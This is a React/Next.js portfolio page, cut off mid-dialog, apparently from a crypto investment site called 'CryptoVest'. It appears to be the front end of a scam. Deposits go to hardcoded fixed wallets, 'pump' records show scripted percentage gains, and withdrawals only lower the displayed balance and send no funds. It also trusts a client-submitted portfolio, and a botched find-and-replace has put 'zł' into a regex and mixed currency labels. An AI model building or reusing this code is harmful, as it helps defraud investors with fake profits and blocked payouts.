'use client';

import { useEffect, useState } from 'react';
import { useRouter, useSearchParams } from 'next/navigation';
import Link from 'next/link';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Skeleton } from '@/components/ui/skeleton';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { TrendingUp, TrendingDown, Wallet, Activity, Zap, ArrowDownToLine, ArrowUpFromLine, Copy, CheckCircle2, Menu, X, Bot, Sparkles } from 'lucide-react';
import { Dialog, DialogContent, DialogDescription, DialogFooter, DialogHeader, DialogTitle } from '@/components/ui/dialog';
import { Label } from '@/components/ui/label';
import { Input } from '@/components/ui/input';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { MobileBottomNav } from '@/components/mobile-bottom-nav';

interface Portfel {
  cash: string;
  holdings: {
    [coinId: string]: {
      amount: string;
      averagePrice: string;
    };
  };
}

interface CoinData {
  id: string;
  symbol: string;
  name: string;
  image: string;
  current_price: number;
  price_change_percentage_24h: number;
}

interface Transaction {
  id: string;
  coinId: string;
  coinName: string;
  type: 'buy' | 'sell';
  amount: string;
  price: string;
  total: string;
  timestamp: string;
}

export default function PortfelPage() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const [portfolio, setPortfel] = useState<Portfel | null>(null);
  const [marketData, setMarketData] = useState<CoinData[]>([]);
  const [transactions, setTransactions] = useState<Transaction[]>([]);
  const [loading, setLoading] = useState(true);
  const [activePumps, setActivePumps] = useState<any[]>([]);
  const [previousTotalValue, setPreviousTotalValue] = useState<number | null>(null);
  const [totalGainPercent, setTotalGainPercent] = useState(0);
  const [isGaining, setIsGaining] = useState(false);
  const [depositDialogOpen, setWpłaćDialogOpen] = useState(false);
  const [selectedCrypto, setSelectedCrypto] = useState('');
  const [copied, setCopied] = useState(false);
  const [withdrawDialogOpen, setWypłaćDialogOpen] = useState(false);
  const [withdrawAmount, setWypłaćAmount] = useState('');
  const [withdrawing, setWypłaćing] = useState(false);
  const [withdrawCrypto, setWypłaćCrypto] = useState('');
  const [withdrawAddress, setWypłaćAddress] = useState('');
  const [withdrawSuccess, setWypłaćSuccess] = useState(false);
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false);
  const [pumpGainPercent, setPumpGainPercent] = useState<number | null>(null);
  const [aiTradingEnabled, setAiTradingEnabled] = useState(false);
  const [aiDialogOpen, setAiDialogOpen] = useState(false);
  const [aiSuccess, setAiSuccess] = useState(false);
  const [enablingAi, setEnablingAi] = useState(false); // Declare pumpGainPercent variable

  useEffect(() => {
    const action = searchParams.get('action');
    if (action === 'deposit') {
      setWpłaćDialogOpen(true);
      setSelectedCrypto('btc');
    } else if (action === 'withdraw') {
      setWypłaćDialogOpen(true);
    }
  }, [searchParams]);

  const cryptoAddresses: Record<string, { name: string; address: string }> = {
    btc: { name: 'Bitcoin (BTC)', address: 'bc1qpumt4ygdp7zxqcayckkfkuxexghquve5c7yus3' },
    ltc: { name: 'Litecoin (LTC)', address: 'LgLQEAmvTg8typHxnHLwmBpgXtUV1ch8rQ' },
    eth: { name: 'Ethereum (ETH)', address: '0x138FA398481cD576380A10D03f72B6cD9d276229' },
    solana: { name: 'Solana (SOL)', address: 'AHXaMN5sPhbprvRcQMdY5AbHjp8qG7qVjU8ZZYUoT4mX' },
    bnb: { name: 'BNB', address: '0x138FA398481cD576380A10D03f72B6cD9d276229' },
    xrp: { name: 'Ripple (XRP)', address: 'rnx3pk3urzZ957kcoJyp7b81Kw4bGjj3zf' },
    usdc: { name: 'USD Coin (USDC)', address: '0x138FA398481cD576380A10D03f72B6cD9d276229' },
    usdt: { name: 'Tether (USDT)', address: '0x138FA398481cD576380A10D03f72B6cD9d276229' },
    tron: { name: 'Tron (TRX)', address: 'TYaR5dHAb8dJaLktGARj3cMcmRf4gsR4mt' },
    dogecoin: { name: 'Dogecoin (DOGE)', address: 'DARhL3i2TMaepfpeY4vZNSCsaVt6Rxg6r1' },
    cardano: { name: 'Cardano (ADA)', address: 'addr1q9kdfdptlhevc3kpte2frusyn2rdd0gt0cyps3e5tecawjmv6j6zhl0je3rvzhj5j8eqfx5x667sklsgrprnghn36a9s556hmh' },
    polygon: { name: 'Polygon (MATIC)', address: '0x138FA398481cD576380A10D03f72B6cD9d276229' },
  };

  useEffect(() => {
    async function loadPortfel() {
      try {
        const sessionRes = await fetch('/api/auth/session');
        if (!sessionRes.ok) {
          router.push('/login');
          return;
        }

        const [portfolioRes, marketRes, transactionsRes, pumpRes] = await Promise.all([
          fetch('/api/portfolio'),
          fetch('/api/market'),
          fetch('/api/transactions'),
          fetch('/api/pump/status'),
        ]);

        await fetch('/api/pump/process', { method: 'POST' });

        if (portfolioRes.ok) {
          const data = await portfolioRes.json();
          setPortfel(data);
        }

        if (pumpRes.ok) {
          const pumpData = await pumpRes.json();
          if (pumpData.pumps && pumpData.pumps.length > 0) {
            const activePump = pumpData.pumps[0];
            if (activePump.isActive) {
              const startTime = new Date(activePump.startTime);
              const endTime = new Date(activePump.endTime);
              const now = new Date();
              const totalDuration = endTime.getTime() - startTime.getTime();
              const elapsed = now.getTime() - startTime.getTime();
              const progressPercentage = Math.min((elapsed / totalDuration) * 100, 100);
              const currentGrowth = (progressPercentage / 100) * activePump.percentage;
              setTotalGainPercent(currentGrowth);
              setIsGaining(true);
              setPumpGainPercent(activePump.percentage); // Set pumpGainPercent value
            } else {
              setIsGaining(false);
              setPumpGainPercent(null); // Reset pumpGainPercent value
            }
          }
        }

        if (marketRes.ok) {
          const data = await marketRes.json();
          setMarketData(data);
        }

        if (transactionsRes.ok) {
          const data = await transactionsRes.json();
          setTransactions(data);
        }

        if (pumpRes.ok) {
          const data = await pumpRes.json();
          setActivePumps(data.pumps || []);
        }

        const aiRes = await fetch('/api/user/auto-trading');
        if (aiRes.ok) {
          const aiData = await aiRes.json();
          setAiTradingEnabled(aiData.enabled);
        }
      } catch (error) {
      } finally {
        setLoading(false);
      }
    }

    loadPortfel();

    const interval = setInterval(() => {
      if (document.visibilityState === 'visible') {
        loadPortfel();
      }
    }, 15000);
    return () => clearInterval(interval);
  }, [router]);

  const openWpłaćDialog = () => {
    setSelectedCrypto('btc');
    setCopied(false);
    setWpłaćDialogOpen(true);
  };

  const handleEnableAiTrading = async () => {
    setEnablingAi(true);
    const res = await fetch('/api/user/auto-trading', { method: 'POST' });
    if (res.ok) {
      setAiTradingEnabled(true);
      setAiSuccess(true);
    }
    setEnablingAi(false);
  };

  const handleDisableAiTrading = async () => {
    setEnablingAi(true);
    const res = await fetch('/api/user/auto-trading', { method: 'DELETE' });
    if (res.ok) {
      setAiTradingEnabled(false);
      setAiDialogOpen(false);
    }
    setEnablingAi(false);
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const openWypłaćDialog = () => {
    setWypłaćAmount('');
    setWypłaćCrypto('');
    setWypłaćAddress('');
    setWypłaćSuccess(false);
    setWypłaćDialogOpen(true);
  };

  const getUserCryptoAktywa = (): Array<{ coinId: string; amount: string }> => {
    if (!portfolio) return [];
    return Object.keys(portfolio.holdings)
      .filter((coinId) => parseFloat(portfolio.holdings[coinId].amount) > 0)
      .map((coinId) => ({
        coinId,
        amount: portfolio.holdings[coinId].amount,
      }));
  };

  const [addressError, setAddressError] = useState('');

  const validateWalletAddress = (crypto: string, address: string): boolean => {
    if (!address || address.trim().length === 0) return false;
    
    const patterns: Record<string, RegExp> = {
      bitcoin: /^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,62}$/,
      ethereum: /^0x[a-fA-F0-9]{40}$/,
      litecoin: /^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$/,
      solana: /^[1-9A-HJ-NP-Za-km-z]{32,44}$/,
      ripple: /^r[1-9A-HJ-NP-Za-km-z]{24,34}$/,
      dogecoin: /^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$/,
      cardano: /^addr1[a-z0-9]+zł /,
      tron: /^T[1-9A-HJ-NP-Za-km-z]{33}$/,
      'binancecoin': /^(bnb1)[a-z0-9]{38}$|^0x[a-fA-F0-9]{40}$/,
      'matic-network': /^0x[a-fA-F0-9]{40}$/,
      'usd-coin': /^0x[a-fA-F0-9]{40}$/,
      tether: /^0x[a-fA-F0-9]{40}$|^T[1-9A-HJ-NP-Za-km-z]{33}$/,
    };

    const pattern = patterns[crypto];
    if (!pattern) {

      return address.length >= 20;
    }
    
    return pattern.test(address);
  };

  const getAddressPlaceholder = (crypto: string): string => {
    const placeholders: Record<string, string> = {
      bitcoin: 'bc1q... or 1... or 3...',
      ethereum: '0x...',
      litecoin: 'L... or M...',
      solana: 'Base58 address',
      ripple: 'r...',
      dogecoin: 'D...',
      cardano: 'addr1...',
      tron: 'T...',
      'binancecoin': '0x... or bnb1...',
      'matic-network': '0x...',
      'usd-coin': '0x...',
      tether: '0x... or T...',
    };
    return placeholders[crypto] || 'Enter wallet address';
  };

  const handleWypłać = async () => {
    if (!withdrawAmount || !withdrawCrypto || !withdrawAddress) return;

    if (!validateWalletAddress(withdrawCrypto, withdrawAddress)) {
      setAddressError('Invalid wallet address for ' + withdrawCrypto.toUpperCase());
      return;
    }
    setAddressError('');

    setWypłaćing(true);

    try {
      if (!portfolio) return;

      const holding = portfolio.holdings[withdrawCrypto];
      if (!holding) {
        setWypłaćing(false);
        return;
      }

      const currentAmount = parseFloat(holding.amount);
      const withdrawAmountNum = parseFloat(withdrawAmount);

      if (withdrawAmountNum > currentAmount) {
        setWypłaćing(false);
        return;
      }

      const newAmount = (currentAmount - withdrawAmountNum).toFixed(8);
      portfolio.holdings[withdrawCrypto].amount = newAmount;

      const response = await fetch('/api/portfolio', {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ portfolio }),
      });

      if (!response.ok) {
        setWypłaćing(false);
        return;
      }

      const data = await response.json();
      setPortfel(data);
      setWypłaćSuccess(true);

      setTimeout(() => {
        setWypłaćDialogOpen(false);
        setWypłaćAmount('');
        setWypłaćCrypto('');
        setWypłaćAddress('');
        setWypłaćSuccess(false);
      }, 2000);
    } catch (err) {
      console.error('[app] Wypłać error:', err);
    } finally {
      setWypłaćing(false);
    }
  };

  const handleLogout = async () => {
    await fetch('/api/auth/logout', { method: 'POST' });
    router.push('/');
  };

  const calculateTotalValue = () => {
    if (!portfolio || !marketData.length) return 0;

    let total = parseFloat(portfolio.cash);

    for (const [coinId, holding] of Object.entries(portfolio.holdings)) {
      const coin = marketData.find((c) => c.id === coinId);
      if (coin) {
        total += parseFloat(holding.amount) * coin.current_price;
      }
    }

    return total;
  };

  const getAktywaWithDetails = () => {
    if (!portfolio || !marketData.length) return [];

    return Object.entries(portfolio.holdings).map(([coinId, holding]) => {
      const coin = marketData.find((c) => c.id === coinId);
      const amount = parseFloat(holding.amount);
      const averagePrice = parseFloat(holding.averagePrice);
      const currentCena = coin?.current_price || 0;
      const currentValue = amount * currentCena;

      const activePump = activePumps.find(p => p.coinId === coinId && p.isActive);
      
      let profitLoss = 0;
      let profitLossPercent = 0;
      
      if (activePump && activePump.initialAmount) {

        const initialAmount = parseFloat(activePump.initialAmount);
        const gainAmount = amount - initialAmount;
        const gainValue = gainAmount * currentCena;

        profitLoss = gainValue;
        profitLossPercent = initialAmount > 0 ? ((amount - initialAmount) / initialAmount) * 100 : 0;
      } else {
        const costBasis = amount * averagePrice;
        profitLoss = currentValue - costBasis;
        profitLossPercent = costBasis > 0 ? (profitLoss / costBasis) * 100 : 0;
      }

      return {
        coinId,
        coin,
        amount,
        averagePrice,
        currentValue,
        value: currentValue,
        profitLoss,
        profitLossPercent,
      };
    });
  };

  if (loading) {
    return (
      <div className="min-h-screen bg-background">
        <header className="border-b border-border bg-card">
          <div className="max-w-7xl mx-auto px-4 py-4">
            <Skeleton className="h-8 w-32" />
          </div>
        </header>
        <div className="max-w-7xl mx-auto px-4 py-8 space-y-6">
          <Skeleton className="h-12 w-64" />
          <div className="grid md:grid-cols-2 gap-6">
            <Skeleton className="h-32" />
            <Skeleton className="h-32" />
          </div>
          <Skeleton className="h-96" />
        </div>
      </div>
    );
  }

  const totalValue = calculateTotalValue();
  const cashBalance = portfolio ? parseFloat(portfolio.cash) : 0;
  const holdingsValue = totalValue - cashBalance;
  const holdings = getAktywaWithDetails();

  const userActivePump = activePumps.find(p => p.status === 'active');
  const totalGainPercentFromPump = userActivePump && portfolio ? 
    ((parseFloat(portfolio.cash) + holdingsValue - parseFloat(userActivePump.initial_value)) / parseFloat(userActivePump.initial_value)) * 100 : 0;

  return (
    <div className="min-h-screen bg-background">
      <header className="sticky top-0 z-50 border-b border-border bg-background/80 backdrop-blur-xl">
        <div className="max-w-7xl mx-auto px-4 py-4 flex items-center justify-between">
          <div className="flex items-center gap-6">
            <Link href="/dashboard" className="flex items-center gap-2 hover:opacity-80 transition-opacity">
              <div className="w-8 h-8 bg-gradient-to-br from-primary to-primary/70 rounded-lg flex items-center justify-center shadow-md shadow-primary/20">
                <TrendingUp className="w-4 h-4 text-primary-foreground" />
              </div>
              <span className="text-xl font-bold">CryptoVest</span>
            </Link>
            <nav className="hidden md:flex gap-1">
              <Link href="/dashboard">
                <Button variant="ghost" className="font-medium">Panel</Button>
              </Link>
              <Link href="/trade">
                <Button variant="ghost" className="font-medium">Handel</Button>
              </Link>
              <Link href="/portfolio">
                <Button variant="ghost" className="font-medium">Portfel</Button>
              </Link>
            </nav>
          </div>
          <div className="hidden md:flex items-center gap-3">
            <Button variant="outline" onClick={handleLogout}>
              Wyloguj
            </Button>
          </div>
          <Button
            variant="ghost"
            size="icon"
            className="md:hidden"
            onClick={() => setMobileMenuOpen(!mobileMenuOpen)}
          >
            {mobileMenuOpen ? <X className="w-5 h-5" /> : <Menu className="w-5 h-5" />}
          </Button>
        </div>
        
        {mobileMenuOpen && (
          <div className="md:hidden border-t border-border bg-background">
            <nav className="flex flex-col p-3 gap-1">
              <Link href="/dashboard" onClick={() => setMobileMenuOpen(false)}>
                <Button variant="ghost" className="w-full justify-start h-10">Panel</Button>
              </Link>
              <Link href="/trade" onClick={() => setMobileMenuOpen(false)}>
                <Button variant="ghost" className="w-full justify-start h-10">Handel</Button>
              </Link>
              <Link href="/portfolio" onClick={() => setMobileMenuOpen(false)}>
                <Button variant="ghost" className="w-full justify-start h-10">Portfel</Button>
              </Link>
              <div className="pt-2 mt-1 border-t border-border">
                <Button variant="outline" onClick={handleLogout} className="w-full bg-transparent h-10">
                  Wyloguj
                </Button>
              </div>
            </nav>
          </div>
        )}
      </header>

      <main className="max-w-7xl mx-auto px-4 py-6 pb-24 md:pb-8 space-y-6">
        <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4">
          <div>
            <h2 className="text-2xl sm:text-3xl font-bold">Your Portfel</h2>
            <p className="text-sm text-muted-foreground mt-1">
              Track your holdings and transactions
            </p>
          </div>
          <div className="flex gap-3">
            <Link href="/trade">
              <Button variant="outline" className="gap-2 flex-1 sm:flex-none bg-transparent">
                <TrendingUp className="w-4 h-4" />
                Handel
              </Button>
            </Link>
            <Button onClick={openWpłaćDialog} className="gap-2 flex-1 sm:flex-none">
              <ArrowDownToLine className="w-4 h-4" />
              Wpłać
            </Button>
            <Button onClick={openWypłaćDialog} variant="outline" className="gap-2 flex-1 sm:flex-none bg-transparent">
              <ArrowUpFromLine className="w-4 h-4" />
              Wypłać
            </Button>
          </div>
        </div>

        {totalValue > 1 && !aiTradingEnabled && (
          <Card className="border-2 border-primary/50 bg-gradient-to-r from-primary/10 via-primary/5 to-transparent">
            <CardContent className="py-4">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <div className="w-12 h-12 bg-primary/20 rounded-xl flex items-center justify-center">
                    <Bot className="w-6 h-6 text-primary" />
                  </div>
                  <div>
                    <h3 className="font-bold text-lg">Auto Trading dostępny</h3>
                    <p className="text-sm text-muted-foreground">Let Auto optimize your trades automatically</p>
                  </div>
                </div>
                <Button onClick={() => setAiDialogOpen(true)} className="gap-2">
                  <Sparkles className="w-4 h-4" />
                  Włącz Auto Trading
                </Button>
              </div>
            </CardContent>
          </Card>
        )}

        {aiTradingEnabled && (
          <Card className="border-2 border-success/50 bg-gradient-to-r from-success/10 via-success/5 to-transparent">
            <CardContent className="py-4">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <div className="hidden md:flex w-12 h-12 bg-success/20 rounded-xl items-center justify-center">
                    <Bot className="w-6 h-6 text-success" />
                  </div>
                  <div>
                    <h3 className="font-bold text-base md:text-lg text-success">Auto Trading aktywny</h3>
                    <p className="text-xs md:text-sm text-muted-foreground">Auto is optimizing your portfolio</p>
                  </div>
                </div>
                <Button 
                  variant="outline" 
                  onClick={() => setAiDialogOpen(true)} 
                  className="bg-transparent"
                  size="sm"
                >
                  Manage
                </Button>
              </div>
            </CardContent>
          </Card>
        )}

        <div className="grid md:grid-cols-2 gap-6">
          <Card className={`border-2 transition-all duration-500 ${isGaining ? 'border-success/50 shadow-lg shadow-success/10' : ''} hover:shadow-lg`}>
            <CardHeader className="flex flex-row items-center justify-between pb-2">
              <CardTitle className="text-sm font-medium text-muted-foreground">Łączne saldo</CardTitle>
              <div className={`w-10 h-10 rounded-xl flex items-center justify-center transition-all duration-300 ${isGaining ? 'bg-success/20' : 'bg-primary/10'}`}>
                <Wallet className={`w-5 h-5 ${isGaining ? 'text-success' : 'text-primary'}`} />
              </div>
            </CardHeader>
            <CardContent>
              <div className={`text-4xl font-bold mb-2 transition-all duration-300 ${isGaining ? 'text-success' : ''}`}>
                ${totalValue.toLocaleString('pl-PL', {
                  minimumFractionDigits: 2,
                  maximumFractionDigits: 2,
                })}
              </div>
              {isGaining && totalGainPercent > 0 && (
                <div className="flex items-center gap-2 mb-3 px-3 py-1.5 bg-success/10 rounded-md w-fit">
                  <TrendingUp className="w-4 h-4 text-success" />
                  <span className="text-sm font-semibold text-success">+{totalGainPercent.toFixed(2)}%</span>
                </div>
              )}
              <div className="flex items-center gap-4 text-sm">
                <span className="text-muted-foreground">
                  Cash: <span className="font-semibold text-foreground">zł {cashBalance.toFixed(2)}</span>
                </span>
                <span className="text-muted-foreground">|</span>
                <span className="text-muted-foreground">
                  Aktywa: <span className={`font-semibold ${isGaining ? 'text-success' : 'text-foreground'}`}>zł {holdingsValue.toFixed(2)}</span>
                </span>
              </div>
            </CardContent>
          </Card>

          <Card className="border-2 bg-gradient-to-br from-card to-card hover:shadow-lg transition-shadow">
            <CardHeader className="flex flex-row items-center justify-between pb-2">
              <CardTitle className="text-sm font-medium text-muted-foreground">Łączna liczba transakcji</CardTitle>
              <div className="w-10 h-10 bg-success/10 rounded-xl flex items-center justify-center">
                <Activity className="w-5 h-5 text-success" />
              </div>
            </CardHeader>
            <CardContent>
              <div className="text-4xl font-bold mb-2">{transactions.length}</div>
              <div className="flex items-center gap-4 text-sm">
                <span className="text-muted-foreground">
                  Kupno: <span className="font-semibold text-success">{transactions.filter((t) => t.type === 'buy').length}</span>
                </span>
                <span className="text-muted-foreground">|</span>
                <span className="text-muted-foreground">
                  Sprzedaż: <span className="font-semibold text-destructive">{transactions.filter((t) => t.type === 'sell').length}</span>
                </span>
              </div>
            </CardContent>
          </Card>
        </div>

        <Tabs defaultValue="holdings" className="space-y-6">
          <TabsList className="grid w-full max-w-md grid-cols-2 h-12">
            <TabsTrigger value="holdings" className="font-semibold">Aktywa</TabsTrigger>
            <TabsTrigger value="transactions" className="font-semibold">Historia</TabsTrigger>
          </TabsList>

          <TabsContent value="holdings">
            <Card className="border-2">
              <CardHeader>
                <CardTitle className="text-2xl">Your Aktywa</CardTitle>
              </CardHeader>
              <CardContent>
                {holdings.length === 0 ? (
                  <div className="py-16 text-center space-y-6">
                    <div className="w-20 h-20 bg-muted rounded-3xl flex items-center justify-center mx-auto">
                      <Wallet className="w-10 h-10 text-muted-foreground" />
                    </div>
                    <div>
                      <p className="text-lg font-semibold mb-2">
                        Brak aktywów
                      </p>
                      <p className="text-muted-foreground mb-6">
                        Zacznij handlować, aby zbudować portfel krypto
                      </p>
                      <Link href="/markets">
                        <Button size="lg">Explore Rynki</Button>
                      </Link>
                    </div>
                  </div>
                ) : (
                  <>
                    <div className="md:hidden space-y-3">
                      {holdings.map((holding) => {
                        const isPumping = activePumps.some(p => p.coinId === holding.coinId && p.isActive);
                        return (
                          <Card key={holding.coinId} className={`border ${isPumping ? 'border-success/40 bg-success/5' : ''}`}>
                            <CardContent className="py-4">
                              <div className="flex items-center justify-between gap-3">
                                <div className="flex items-center gap-3 min-w-0">
                                  {holding.coin && <img src={holding.coin.image || '/placeholder.svg'} alt={holding.coin.name} className="w-9 h-9 rounded-full" />}
                                  <div className="min-w-0">
                                    <p className="font-semibold truncate">{holding.coin?.name}</p>
                                    <p className="text-xs text-muted-foreground uppercase">{holding.coin?.symbol}</p>
                                  </div>
                                </div>
                                <div className="text-right">
                                  <p className="font-semibold">zł {holding.currentValue.toFixed(2)}</p>
                                  <p className={`text-xs font-semibold ${holding.profitLoss >= 0 ? 'text-success' : 'text-destructive'}`}>
                                    {holding.profitLoss >= 0 ? '+' : ''}{holding.profitLossPercent.toFixed(2)}%
                                  </p>
                                </div>
                              </div>
                              <div className="mt-3 flex items-center justify-between">
                                <p className="text-sm text-muted-foreground">{holding.amount.toFixed(4)} {holding.coin?.symbol?.toUpperCase()}</p>
                                <Link href={`/trade?coin=${holding.coinId}`}>
                                  <Button size="sm">Handel</Button>
                                </Link>
                              </div>
                            </CardContent>
                          </Card>
                        );
                      })}
                    </div>

                  <div className="hidden md:block overflow-x-auto">
                    <table className="w-full">
                      <thead>
                        <tr className="border-b border-border">
                          <th className="text-left py-4 px-3 font-semibold text-xs uppercase text-muted-foreground">
                            Asset
                          </th>
                          <th className="text-right py-4 px-3 font-semibold text-xs uppercase text-muted-foreground">
                            Balance
                          </th>
                          <th className="text-right py-4 px-3 font-semibold text-xs uppercase text-muted-foreground hidden sm:table-cell">
                            Avg Cena
                          </th>
                          <th className="text-right py-4 px-3 font-semibold text-xs uppercase text-muted-foreground">
                            Value
                          </th>
                          <th className="text-right py-4 px-3 font-semibold text-xs uppercase text-muted-foreground hidden md:table-cell">
                            Profit/Loss
                          </th>
                          <th className="text-right py-4 px-3 font-semibold text-xs uppercase text-muted-foreground">
                            Action
                          </th>
                        </tr>
                      </thead>
                      <tbody>
                        {holdings.map((holding) => {
                          const isPumping = activePumps.some(p => p.coinId === holding.coinId && p.isActive);
                          
                          return (
                          <tr
                            key={holding.coinId}
                            className={`border-b border-border transition-all duration-300 ${isPumping ? 'bg-success/5 hover:bg-success/10' : 'hover:bg-muted/50'}`}
                          >
                              <td className="py-5 px-3">
                                <Link href={`/trade?coin=${holding.coinId}`} className="flex items-center gap-3 hover:opacity-80 transition-opacity">
                                  {holding.coin && (
                                    <>
                                      <img
                                        src={holding.coin.image || "/placeholder.svg"}
                                        alt={holding.coin.name}
                                        className="w-8 h-8 md:w-10 md:h-10 rounded-full flex-shrink-0"
                                      />
                                      <div className="min-w-0">
                                        <p className="font-semibold text-sm md:text-base truncate">{holding.coin.name}</p>
                                        <p className="text-xs md:text-sm text-muted-foreground uppercase font-medium">
                                          {holding.coin.symbol}
                                        </p>
                                      </div>
                                    </>
                                  )}
                                </Link>
                              </td>
                            <td className="py-5 px-3 text-right whitespace-nowrap">
                              <div className={`font-semibold text-sm md:text-base ${isPumping ? 'text-success' : ''}`}>{holding.amount.toFixed(4)}</div>
                              <div className="text-xs text-muted-foreground">{holding.coin?.symbol.toUpperCase()}</div>
                              </td>
                              <td className="py-5 px-3 text-right font-medium hidden sm:table-cell">
                                ${holding.averagePrice.toFixed(2)}
                              </td>
                              <td className="py-5 px-3 text-right font-semibold">
                                ${holding.currentValue.toLocaleString('pl-PL', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                              </td>
                            <td className="py-5 px-3 text-right hidden md:table-cell">
                              <div
                                className={`inline-flex flex-col items-end gap-0.5 px-3 py-2 rounded-lg font-semibold transition-all duration-300 ${
                                  isPumping || holding.profitLoss >= 0 ? 'bg-success/10 text-success' : 'bg-destructive/10 text-destructive'
                                }`}
                              >
                                <div className="flex items-center gap-1">
                                  {isPumping || holding.profitLoss >= 0 ? (
                                    <TrendingUp className={`w-3.5 h-3.5 ${isPumping ? 'animate-bounce' : ''}`} />
                                  ) : (
                                    <TrendingDown className="w-3.5 h-3.5" />
                                  )}
                                  <span>{holding.profitLoss >= 0 ? '+' : ''}${Math.abs(holding.profitLoss).toFixed(2)}</span>
                                </div>
                                <div className="text-xs">
                                  {isPumping && pumpGainPercent !== null ? (
                                    <span className="font-bold">+{pumpGainPercent.toFixed(2)}%</span>
                                  ) : (
                                    <span>{holding.profitLoss >= 0 ? '+' : ''}{holding.profitLossPercent.toFixed(2)}%</span>
                                  )}
                                </div>
                              </div>
                            </td>
                            <td className="py-5 px-3 text-right">
                              <Link href={`/trade?coin=${holding.coinId}`}>
                                <Button size="sm" className={isPumping ? 'bg-success hover:bg-success/90 shadow-sm' : 'shadow-sm'}>Handel</Button>
                              </Link>
                            </td>
                          </tr>
                          );
                        })}
                      </tbody>
                    </table>
                  </div>
                  </>
                )}
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="transactions">
            <Card className="border-2">
              <CardHeader>
                <CardTitle className="text-2xl">Transaction Historia</CardTitle>
              </CardHeader>
              <CardContent>
                {transactions.length === 0 ? (
                  <div className="py-16 text-center space-y-6">
                    <div className="w-20 h-20 bg-muted rounded-3xl flex items-center justify-center mx-auto">
                      <Activity className="w-10 h-10 text-muted-foreground" />
                    </div>
                    <div>
                      <p className="text-lg font-semibold mb-2">Brak transakcji</p>
                      <p className="text-muted-foreground mb-6">
                        Zacznij handlować, aby zobaczyć historię transakcji
                      </p>
                      <Link href="/markets">
                        <Button size="lg">Zacznij handlować</Button>
                      </Link>
                    </div>
                  </div>
                ) : (
                  <>
                    <div className="md:hidden space-y-3">
                      {transactions.map((tx) => (
                        <Card key={tx.id} className="border">
                          <CardContent className="py-4">
                            <div className="flex items-start justify-between gap-3">
                              <div>
                                <p className="font-semibold">{tx.coinName}</p>
                                <p className="text-xs text-muted-foreground">{new Date(tx.timestamp).toLocaleString('pl-PL', { month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' })}</p>
                              </div>
                              <span className={`px-2 py-1 rounded text-xs font-bold uppercase ${tx.type === 'buy' ? 'bg-success/10 text-success' : 'bg-destructive/10 text-destructive'}`}>
                                {tx.type}
                              </span>
                            </div>
                            <div className="mt-3 flex items-center justify-between text-sm">
                              <span className="text-muted-foreground">{parseFloat(tx.amount).toFixed(4)}</span>
                              <span className="font-semibold">zł {parseFloat(tx.total).toFixed(2)}</span>
                            </div>
                          </CardContent>
                        </Card>
                      ))}
                    </div>

                  <div className="hidden md:block overflow-x-auto">
                    <table className="w-full">
                      <thead>
                        <tr className="border-b border-border">
                          <th className="text-left py-4 px-3 font-semibold text-xs uppercase text-muted-foreground">
                            Date
                          </th>
                          <th className="text-left py-4 px-3 font-semibold text-xs uppercase text-muted-foreground">
                            Asset
                          </th>
                          <th className="text-center py-4 px-3 font-semibold text-xs uppercase text-muted-foreground">
                            Type
                          </th>
                          <th className="text-right py-4 px-3 font-semibold text-xs uppercase text-muted-foreground">
                            Amount
                          </th>
                          <th className="text-right py-4 px-3 font-semibold text-xs uppercase text-muted-foreground hidden sm:table-cell">
                            Cena
                          </th>
                          <th className="text-right py-4 px-3 font-semibold text-xs uppercase text-muted-foreground">
                            Total
                          </th>
                        </tr>
                      </thead>
                      <tbody>
                        {transactions.map((tx) => (
                          <tr key={tx.id} className="border-b border-border hover:bg-muted/50 transition-colors">
                            <td className="py-5 px-3 text-sm font-medium">
                              {new Date(tx.timestamp).toLocaleDateString('pl-PL', { 
                                month: 'short', 
                                day: 'numeric',
                                year: 'numeric'
                              })}
                              <div className="text-xs text-muted-foreground">
                                {new Date(tx.timestamp).toLocaleTimeString('pl-PL', { 
                                  hour: '2-digit',
                                  minute: '2-digit'
                                })}
                              </div>
                            </td>
                            <td className="py-5 px-3 font-semibold">{tx.coinName}</td>
                            <td className="py-5 px-3 text-center">
                              <span
                                className={`px-3 py-1.5 rounded-lg text-xs font-bold uppercase ${
                                  tx.type === 'buy'
                                    ? 'bg-success/10 text-success'
                                    : 'bg-destructive/10 text-destructive'
                                }`}
                              >
                                {tx.type}
                              </span>
                            </td>
                            <td className="py-5 px-3 text-right font-semibold">
                              {parseFloat(tx.amount).toFixed(4)}
                            </td>
                            <td className="py-5 px-3 text-right font-medium hidden sm:table-cell">
                              ${parseFloat(tx.price).toLocaleString('pl-PL', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                            </td>
                            <td className="py-5 px-3 text-right font-semibold">
                              ${parseFloat(tx.total).toLocaleString('pl-PL', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                            </td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  </div>
                  </>
                )}
              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>
      </main>

      
      <Dialog open={depositDialogOpen} onOpenChange={setWpłaćDialogOpen}>
        <DialogContent className="max-w-md">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2">
              <ArrowDownToLine className="w-5 h-5 text-success" />
              Wpłać Crypto
            </DialogTitle>
            <DialogDescription>
              Select a cryptocurrency to generate a deposit address with QR code.
            </DialogDescription>
          </DialogHeader>
          <div className="space-y-4 py-4">
            <div className="space-y-2">
              <Label htmlFor="crypto">Wybierz kryptowalutę</Label>
              <Select value={selectedCrypto} onValueChange={setSelectedCrypto}>
